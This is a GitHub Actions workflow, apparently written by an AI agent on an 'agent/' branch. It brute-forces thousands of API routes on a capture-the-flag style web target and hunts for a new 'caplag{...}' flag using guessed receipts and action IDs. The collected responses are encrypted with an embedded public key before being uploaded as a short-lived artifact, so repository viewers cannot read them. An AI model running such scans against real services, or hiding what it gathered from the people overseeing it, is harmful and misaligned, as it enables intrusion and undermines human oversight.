name: launchlet-part3-api2word

on:
  push:
    branches: [agent/launchlet-part3-api2word-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 6
    steps:
      - name: Discover two-word API routes and encrypt non-not-found responses
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re,threading,itertools
          from concurrent.futures import ThreadPoolExecutor,as_completed
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru'; out=pathlib.Path('package/out')
          nouns=['actions','action','receipts','receipt','deploys','deploy','deployments','deployment','previews','preview','builds','build','artifacts','artifact','releases','release','publishes','publish','promotions','promotion','exports','export','refs','ref','references','reference','deploy-refs','deployrefs','deploy-references','capabilities','capability','inspectors','inspector','projects','project','workspaces','workspace','jobs','job','tasks','task','runs','run','outputs','output','bundles','bundle','manifests','manifest','environments','environment','configs','config','secrets','secret','tokens','token','server-actions','server-references','internal','enterprise','production']
          verbs=['invoke','redeem','resolve','inspect','export','publish','promote','release','finalize','approve','open','read','get','fetch','lookup','download','view','preview','create','start','run','execute','render','build','deploy','generate','load','exchange','use','verify','validate','status','details','metadata','manifest','output','config','env','logs','files','source','bundle','artifact','receipt','reference','secret','token']
          paths=['/api/'+n+'/'+v for n in nouns for v in verbs]
          # Known routes included as controls.
          headers={'Content-Type':'application/json','Accept':'application/json','X-Launchlet-Preview':'launchlet-demo-board'}
          payload={'actionId':'act_6f4b9a2c1d0e8a71','args':{'workspaceId':'ws-launchlet-public','projectId':'launchlet-demo-board'},'receipt':'lrec_preview_demo_2026','project':'launchlet-demo-board','deployRef':'preview-8b11c','ref':'preview-8b11c','id':'preview-8b11c'}
          hits=[]; lock=threading.Lock(); stop=threading.Event()
          generic={'{"error":"not_found"}','404 page not found\n'}
          def probe(path):
            if stop.is_set():return None
            s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
            try:r=s.post(base+path,headers=headers,json=payload,timeout=4,allow_redirects=False)
            except Exception as e:return None
            if r.status_code==404 and r.text in generic:return None
            item={'path':path,'status':r.status_code,'body':r.text,'headers':dict(r.headers)}
            if re.search(r'caplag\{[^}]+\}',r.text) and 'preview_manifest_kept_the_receipt' not in r.text:stop.set()
            return item
          with ThreadPoolExecutor(max_workers=4) as ex:
            fs={ex.submit(probe,p):p for p in paths}
            for f in as_completed(fs):
              item=f.result()
              if item:
                with lock:hits.append(item)
                flags=re.findall(r'caplag\{[^}]+\}',item.get('body',''))
                if any(x!='caplag{preview_manifest_kept_the_receipt}' for x in flags):
                  (out/'FOUND.txt').write_text(item['path']+'\n'+item['body']);stop.set();break
          (out/'summary.json').write_text(json.dumps({'path_count':len(paths),'hits':hits},indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(xxd -p -c 256 package/aes.key)"; IV_HEX="$(xxd -p -c 256 package/iv.bin)"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-api2word-encrypted
          path: artifact/
          retention-days: 1
